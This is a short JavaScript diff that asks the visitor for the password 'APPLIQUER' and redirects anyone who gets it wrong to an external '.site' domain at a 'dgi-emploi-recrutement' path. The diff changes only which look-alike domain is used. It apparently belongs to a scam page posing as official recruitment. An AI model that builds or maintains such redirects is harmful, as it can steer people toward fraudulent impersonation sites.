@@ -4,5 +4,5 @@ password = prompt(
   'APPLIQUER'
 );
 if (password != 'APPLIQUER') {
-  location.href = 'https://www.withofitid.site/dgi-emploi-recrutement';
+  location.href = 'https://www.soulofitid.site/dgi-emploi-recrutement';
 }
